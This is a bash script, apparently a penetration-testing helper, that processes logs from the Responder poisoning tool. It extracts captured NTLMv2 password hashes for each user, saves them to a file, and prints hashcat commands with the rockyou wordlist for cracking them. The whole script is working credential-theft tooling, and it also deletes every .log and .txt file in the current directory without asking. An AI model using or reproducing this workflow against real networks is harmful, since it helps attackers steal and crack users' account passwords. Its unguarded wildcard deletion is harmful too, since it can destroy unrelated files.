#!/bin/bash

# ==> After running Responder and file "Responder-Session.log" is generated in "/usr/share/responder/logs/", run the following bash script

RED="31"
GREEN="32"
BOLDGREEN="\e[1;${GREEN}m"
ENDCOLOR="\e[0m"

read -p "[+] Name of directory to drop hashes file: " hash_dir

mkdir $hash_dir

file_directory="$(pwd)/$hash_dir"

echo "[+] Directory created '$file_directory' "

cp /usr/share/responder/logs/* .

read -p "[+] Enter filename to write hashes to: " file

for u in $(grep "NTLMv2-SSP Hash" Responder-Session.log |cut -d ":" -f 4-6|sort -u -f|awk '{$1=$1};1');
 do echo "[+] Found user: $u";
    grep "NTLMv2-SSP Hash" Responder-Session.log|grep -i $u|cut -d ":" -f 4-10 |head -n 1|awk '{$1=$1};1;END{print "\n"}' >> $file_directory/$file;
done

rm *.log *.txt

echo -e "\n${BOLDGREEN}[+]${ENDCOLOR} Hashes written to ${BOLDGREEN}'$file_directory/$file'${ENDCOLOR}"

echo -e "\n\n${BOLDGREEN}=== To crack with HashCat ===${ENDCOLOR}"
echo -e "\n1. Run ${BOLDGREEN}sed -i '/^$/d'${ENDCOLOR} $file_directory/$file "
echo -e "\n2. hashcat -m 5600 $file_directory/$file rockyou.txt"
